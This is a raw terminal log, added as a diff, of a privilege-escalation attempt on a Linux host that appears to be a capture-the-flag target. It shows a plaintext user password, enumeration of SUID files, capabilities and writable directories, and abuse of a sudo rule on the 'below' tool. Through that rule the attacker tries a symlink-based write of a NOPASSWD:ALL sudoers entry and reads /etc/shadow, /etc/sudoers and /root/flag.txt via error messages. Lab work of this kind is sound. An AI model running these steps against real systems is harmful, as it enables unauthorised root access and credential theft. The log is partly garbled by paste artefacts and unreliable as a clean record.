@@ -1,0 +1,467 @@
+www-data@ip-10-0-3-227:/var/www/blogo$ whoami
+whoami
+www-data
+www-data@ip-10-0-3-227:/var/www/blogo$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),101(mysql)
+www-data@ip-10-0-3-227:/var/www/blogo$ uname -a
+uname -a
+Linux ip-10-0-3-227 6.8.0-1021-aws #23-Ubuntu SMP Mon Dec  9 23:59:34 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ip-10-0-3-227:/var/www/blogo$ sudo -l
+sudo -l
+[sudo] password for www-data: 
+
+Sorry, try again.
+[sudo] password for www-data: WPcmqw16ZmzO!5paSC4^[[A
+
+Sorry, try again.
+[sudo] password for www-data: WPcmqw16ZmzO!5paSC4
+
+sudo: 3 incorrect password attempts
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/sudo
+www-data@ip-10-0-3-227:/var/www/blogo$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+www-data@ip-10-0-3-227:/var/www/blogo$ cat /etc/crontab
+ls -la /etc/cron*cat /etc/crontab
+cat: /etc/crontab: No such file or directory
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /root
+cat /root/flag.txtls -la /root
+ls: cannot open directory '/root': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ groups
+groups
+www-data mysql
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ps aux | grep root
+ps aux | grep root
+root           1  0.0  0.3   4588  3456 pts/0    Ss+  19:13   0:00 bash
+root          26  0.0  1.3 203872 12932 ?        Ss   19:13   0:00 /usr/sbin/apache2 -k start
+www-data     454  0.0  0.2   3912  2048 pts/4    S+   19:22   0:00 grep root
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+
+www-data@ip-10-0-3-227:/var/www/blogo$ find / -writable -type d 2>/dev/null     
+find / -writable -type d 2>/dev/null
+/proc/456/task/456/fd
+/proc/456/fd
+/proc/456/map_files
+/tmp
+/dev/mqueue
+/dev/shm
+/var/lib/php/sessions
+/var/cache/apache2/mod_cache_disk
+/var/tmp
+/var/log/below
+/var/www/blogo
+/var/www/blogo/config
+/var/www/blogo/files
+/run/lock
+/run/lock/apache2
+/run/apache2/socks
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql
+ls -la /var/lib/mysql
+ls: cannot open directory '/var/lib/mysql': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql-files
+ls -la /var/lib/mysql-files
+ls: cannot open directory '/var/lib/mysql-files': Permission denied
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql
+ls -la /var/lib/mysql
+ls: cannot open directory '/var/lib/mysql': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ su adalberto
+su adalberto
+Password: WPcmqw16ZmzO!5paSC4
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo -i
+sudo -i
+[sudo] password for adalberto: WPcmqw16ZmzO!5paSC4
+
+Sorry, user adalberto is not allowed to execute '/bin/bash' as root on ip-10-0-3-227.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo -l
+sudo -l
+Matching Defaults entries for adalberto on ip-10-0-3-227:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User adalberto may run the following commands on ip-10-0-3-227:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/below *, !/usr/local/bin/below
+        --config*, !/usr/local/bin/below --debug*, !/usr/local/bin/below -d*
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ file /usr/local/bin/below              
+file /usr/local/bin/below
+bash: file: command not found
+adalberto@ip-10-0-3-227:/var/www/blogo$ /usr/local/bin/below --help
+/usr/local/bin/below --help
+Usage: below [OPTIONS] [COMMAND]
+
+Commands:
+  live      Display live system data (interactive) (default)
+  record    Record local system data (daemon mode)
+  replay    Replay historical data (interactive)
+  debug     Debugging facilities (for development use)
+  dump      Dump historical data into parseable text format
+  snapshot  Create a historical snapshot file for a given time range
+  help      Print this message or the help of the given subcommand(s)
+
+Options:
+      --config <CONFIG>  [default: /etc/below/below.conf]
+  -d, --debug            
+  -h, --help             Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ strings /usr/local/bin/below | less              
+strings /usr/local/bin/below | less
+bash: less: command not found
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:30:32 UTC-03:00     Elapsed: 0s     ip-10-0-3-227     0.8.1     │
+│live                                                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    ?                    User     ?                       │
+│System   ?                                                                    │
+│Mem            Total    918.2 MB             Free     76.6 MB                 │
+│Anon     494.8 MB             File     160.8 MB                               │
+│VM             Page In  ?                    Page Out ?                       │
+│Swap In  ?                    Swap Out ?                                      │
+│I/O   (Rd|Wr)                                                                 │
+│Iface (Rx|Tx)  docker0  ?         |?         ens5     ?         |?            │
+│lo       ?         |?                                                         │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│General   CPU   Mem   I/O   Pressure   Properties                             │
+│──────────────────────────────────────────────────────────────────────────────│
+│Name                                               CPU        Mem        CPU P│
+│──────────────────────────────────────────────────────────────────────────────│
+│<root>                                             ?          ?          0.00%│
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒-------------------------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:31:33 UTC-03:00     Elapsed: 5s     ip-10-0-3-227     0.8.1     │
+│live                                                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    1.90%                User     0.50%                   │
+│System   1.40%                                                                │
+│Mem            Total    918.2 MB             Free     70.9 MB                 │
+│Anon     496.1 MB             File     161.3 MB                               │
+│VM             Page In  0.0 B/s              Page Out 0.0 B/s                 │
+│Swap In  0.0 B/s              Swap Out 0.0 B/s                                │
+│I/O   (Rd|Wr)  nvme0n1  0.0 B/s   |0.0 B/s                                    │
+│Iface (Rx|Tx)  docker0  0.0 B     |0.0 B     ens5     44.9 B    |474.9 B      │
+│lo       0.0 B     |0.0 B                                                     │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│General   CPU   Mem   I/O   Pressure   Properties                             │
+│──────────────────────────────────────────────────────────────────────────────│
+│Name                                               CPU        Mem        CPU P│
+│──────────────────────────────────────────────────────────────────────────────│
+│<root>                                             4.34!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒-------------------------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+
+
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:35:57 UTC-03:00     Elapsed: 5s     ip-10-0-3-227     0.8.1     │
+│live-paused                                                                   │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    4.30%                User     1.10%                   │
+│System   2.90%                                                                │
+│Mem            Total    918.2 MB             Free     100.9 MB                │
+│Anon     506.3 MB             File     128.4 MB                               │
+│VM             Page In  0.┌┤ Filter by Idx        ├┐t 0.0 B/s                 │
+│Swap In  0.0 B/s          │                        │                          │
+│I/O   (Rd|Wr)  nvme0n1  0.│ usr/local/bin/below sn │                          │
+│Iface (Rx|Tx)  docker0  0.│                        │  55.2 B    |856.8 B      │
+│lo       0.0 B     |0.0 B │       <Close> <Filter> │                          │
+└──────────────────────────└────────────────────────┘──────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU   Mem   Vm   Slab   Disk   Btrfs                                          │
+│──────────────────────────────────────────────────────────────────────────────│
+│Idx        Usage      User       System     Idle       Nice       IOWait     I│
+│──────────────────────────────────────────────────────────────────────────────│
+│0          4.39%      1.00%      2.99%      95.61%     0.00%      0.00%      0│ow snapshot /tmp/test.snap
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒----------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot /tmp/test.snap
+sudo /usr/local/bin/below snapshot /tmp/test.snap
+error: unexpected argument '/tmp/test.snap' found
+
+Usage: below snapshot [OPTIONS] --begin <BEGIN>
+
+For more information, try '--help'.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /tmp/test.snap^[[201~
+ls -la /tmp/test.snap
+ls: cannot access '/tmp/test.snap': No such file or directory
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot --help --help^[[201~
+Create a historical snapshot file for a given time range
+
+Usage: below snapshot [OPTIONS] --begin <BEGIN>
+
+Options:
+  -b, --begin <BEGIN>        Begin time, same format as replay
+  -e, --end <END>            End time, same format as replay
+      --duration <DURATION>  Time string specifying the snapshot duration, e.g. "10 min"
+                             
+                             Keywords: days min, h, sec
+                             
+                             Relative: {humantime}, e.g. "2 days 3 hr 15m 10sec"
+                             
+                             _
+  -o, --output <OUTPUT>      Output file path. Randomized name in current directory if unspecified
+  -s, --host <HOST>          Supply hostname to take snapshot from remote
+      --port <PORT>          Override default port to connect to remote
+  -h, --help                 Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --help^[[201~
+sudo /usr/local/bin/below dump --help
+Dump historical data into parseable text format
+
+Usage: below dump [OPTIONS] <COMMAND>
+
+Commands:
+  system         Dump system stats
+  disk           Dump disk stats
+  btrfs          Dump btrfs Stats
+  process        Dump process stats
+  cgroup         Dump cgroup stats
+  iface          Dump the link layer iface stats
+  network        Dump the network layer stats including ip and icmp
+  transport      Dump the transport layer stats including tcp and udp
+  ethtool-queue  Dump network interface queue stats
+  help           Print this message or the help of the given subcommand(s)
+
+Options:
+  -s, --host <HOST>          Supply hostname to activate remote dumping
+      --port <PORT>          Override default port to connect remote dumping to
+      --snapshot <SNAPSHOT>  Dump from a snapshot file generated by the snapshot command instead of
+                             from the store directory
+  -h, --help                 Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+          
+          N.B. Since the active shard cannot be deleted, the size limit may be exceeded by a single
+          active shard.
+
+      --collect-io-stat
+          Whether or not to collect io.stat for cgroups which could be expensive
+
+      --port <PORT>
+          Override default port for remote viewing server
+
+      --skew-detection-threshold-ms <SKEW_DETECTION_THRESHOLD_MS>
+          Threshold for hold long data collection takes to trigger warnings
+          
+          [default: 500]
+
+      --disable-disk-stat
+          Flag to disable disk_stat collection
+
+      --disable-exitstats
+          Flag to disable eBPF-based exitstats
+
+      --compress
+          Enable zstd data file compression
+          
+          Depending on typical data, you can expect around 10x smaller data files, and an even
+          higher compression ratio if used with --dict-compress-chunk-size.
+
+      --dict-compress-chunk-size <DICT_COMPRESS_CHUNK_SIZE>
+          Only valid when used with --compress. Must be at least 2, a power of 2, and at most 32768.
+          
+          If specified, zstd dictionary compression is used in aligned chunks of size
+          --dict-compress-chunk-size. The first frame of each is used as a zstd dictionary for the
+          frames in the rest of the chunk.
+          
+          With --dict-compress-chunk-size 16, you can expect around 20-30x smaller data files.
+
+  -h, --help
+          Print help (see a summary with '-h')
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /etc/sudoers.d/pwns.d/pwn^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:42:38.808 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:42:38.808 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /etc/sudoers.d/^[[201~
+ls -la /etc/sudoers.d/
+total 16
+drwxr-xr-x 2 root root 4096 Jan 12 18:13 .
+drwxr-xr-x 1 root root 4096 Feb 27 19:13 ..
+-r--r----- 1 root root 1068 Jan 29  2024 README
+-r--r----- 1 root root  149 Jan 12 18:13 adalberto-below
+adalberto@ip-10-0-3-227:/var/www/blogo$ echo "adalberto ALL=(ALL) NOPASSWD:ALL" > /tmp/x /tmp/x^[[201~
+adalberto@ip-10-0-3-227:/var/www/blogo$ > /tmp/x
+                                                                               p
+adalberto@ip-10-0-3-227:/var/www/blogo$ ln -sf /etc/sudoers.d/pwn /tmp/test.snap t.snap^[[201~
+ln -sf /etc/sudoers.d/pwn /tmp/test.snap 
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /tmp/test.snapst.snap^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:43:15.410 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:43:15.410 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /root/testot/test^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:43:19.815 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:43:19.815 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo mkdir -p /var/log/below/store^[[201~
+sudo mkdir -p /var/log/below/store
+[sudo] password for adalberto: WPcmqw16ZmzO!5paSC4
+
+Sorry, user adalberto is not allowed to execute '/usr/bin/mkdir -p /var/log/below/store' as root on ip-10-0-3-227.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below dump system --snapshot /etc/passwd/passwd^[[201~
+error: unexpected argument '--snapshot' foundhot /etc/passwd
+
+Usage: below dump system [OPTIONS] --begin <BEGIN>
+
+For more information, try '--help'.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/passwd system --begin "1 min ago"
+Feb 27 19:46:40.410 ERRO  dump --snapshot /etc/passwd system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: login
+sy when getting cksum for root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /root/flag.txt system --begin "1 min ago"
+Feb 27 19:47:16.005 ERRO  dump --snapshot /root/flag.txt system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below dump --snapshot /root system --begin "1 min ago"in ago"^[[201~
+Feb 27 19:47:54.194 ERRO  dump --snapshot /root system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: Is a directory (os error 21)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /proc/self/root/root/flag.txt system --begin "1 min ago"cal/bin/below dump --snapshot /proc/self/root/root/flag.txt system --begin "1 min ago"
+Feb 27 19:48:17.632 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/shadow system --begin "1 min ago"
+Feb 27 19:49:25.972 ERRO  dump --snapshot /etc/shadow system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: 999:7::: when getting cksum for root:*:20237:0:99999:7:::
+daemon:*:20237:0:99999:7:::
+bin:*:20237:0:99999:7:::
+sys:*:20237:0:99999:7
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /root/.bash_history system --begin "1 min ago"do /usr/local/bin/below dump --snapshot /root/.bash_history system --begin "1 min ago"
+Feb 27 19:54:22.750 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~cat /etc/sudoers^[[201~
+cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /etc/sudoers.d^[[201~
+ls -la /etc/sudoers.d
+total 16
+drwxr-xr-x 2 root root 4096 Jan 12 18:13 .
+drwxr-xr-x 1 root root 4096 Feb 27 19:13 ..
+-r--r----- 1 root root 1068 Jan 29  2024 README
+-r--r----- 1 root root  149 Jan 12 18:13 adalberto-below
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~cat /etc/sudoers.d/*^[[201~
+cat /etc/sudoers.d/*
+cat: /etc/sudoers.d/README: Permission denied
+cat: /etc/sudoers.d/adalberto-below: Permission denied
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers system --begin "1 min ago"
+Feb 27 19:57:45.723 ERRO  dump --snapshot /etc/sudoers system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: difying  when getting cksum for #
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local con
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers.d/adalberto-below system --begin "1 min ago"al/bin/below dump --snapshot /etc/sudoers.d/adalberto-below system --begin "1 min ago"
+Feb 27 19:57:50.404 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers.d/README system --begin "1 min ago" /usr/local/bin/below dump --snapshot /etc/sudoers.d/README system --begin "1 min ago"
+Feb 27 20:00:28.126 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: his will when getting cksum for #
+# The default /etc/sudoers file created on installation of the
+# sudo  package now includes the di
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --snapssudo /usr/local/bin/below dump --snapshot /proc/1/environ system --begin "1 min ago"3~sudo /usr/local/bin/below dump --snapshot /proc/1/environ system --begin "1 min ago"
+Feb 27 20:00:37.514 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
